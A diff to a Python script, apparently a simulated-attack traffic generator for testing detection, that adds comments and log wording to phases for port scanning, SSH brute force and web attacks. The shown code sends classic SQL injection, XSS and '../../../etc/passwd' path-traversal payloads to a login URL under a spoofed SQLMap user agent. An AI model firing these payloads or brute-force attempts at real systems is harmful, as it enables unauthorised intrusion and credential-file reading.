@@ -40,13 +40,14 @@ def simulate_ssh_bruteforce(target_ip):
 
 def simulate_web_attacks(target_ip):
     payloads = [
-        "1' OR '1'='1",
-        "admin' --",
-        "<script>alert(1)</script>",
-        "../../../etc/passwd"
+        "1' OR '1'='1",              # Classic SQLi
+        "admin' --",                 # SQLi bypass
+        "<script>alert(1)</script>", # Classic XSS
+        "../../../etc/passwd"        # Path Traversal
     ]
     for payload in payloads:
         try:
+            # Send payload in the query string
             encoded_payload = urllib.parse.quote(payload)
             url = f"http://{target_ip}/login?user={encoded_payload}"
             req = urllib.request.Request(url, headers={'User-Agent': 'SQLMap/1.4'})
@@ -108,7 +109,8 @@ def simulate_data_exfiltration(target_ip):
 def main():
     logging.info("Starting ADVANCED SIMULATED ATTACK (0-days, DoS, Exfiltration)...")
     
-    logging.info("Phase 1: Port Scan...")
+    # 1. Multi-Threaded Port Scan
+    logging.info("Phase 1: Executing rapid Port Scan on target subnets...")
     with ThreadPoolExecutor(max_workers=20) as executor:
         for server in SERVERS:
             for port in PORTS_TO_SCAN:
@@ -116,14 +118,16 @@ def main():
                 
     time.sleep(1)
     
-    logging.info("Phase 2: SSH Brute-Force...")
+    # 2. SSH Brute Force
+    logging.info("Phase 2: Executing SSH Brute-Force...")
     with ThreadPoolExecutor(max_workers=10) as executor:
         for server in SERVERS:
             executor.submit(simulate_ssh_bruteforce, server)
             
     time.sleep(1)
             
-    logging.info("Phase 3: Layer 7 Web Attacks (SQLi & XSS)...")
+    # 3. Web Attacks (SQLi / XSS)
+    logging.info("Phase 3: Executing Layer 7 Web Attacks (SQLi & XSS)...")
     with ThreadPoolExecutor(max_workers=5) as executor:
         for server in SERVERS:
             executor.submit(simulate_web_attacks, server)
